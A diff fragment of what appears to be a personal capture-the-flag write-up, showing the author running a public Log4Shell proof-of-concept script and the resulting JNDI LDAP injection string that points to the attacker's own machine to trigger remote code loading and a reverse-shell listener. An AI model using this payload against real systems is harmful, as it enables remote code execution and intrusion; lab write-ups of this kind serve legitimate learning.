@@ -19,7 +19,7 @@
    >>	problem was to find a minecraft server cuz there waas no way for me to install minecraft in my vm xD
 
    >>	found a repo on git 
-        
+            
         ```poc.py
             python3 poc.py --userip 10.10.16.77 --webport 8000 --lport 9001 ## add ur tun0 ip instead of localhost  
             [+] Send me: ${jndi:ldap://10.10.16.77:1389/a}
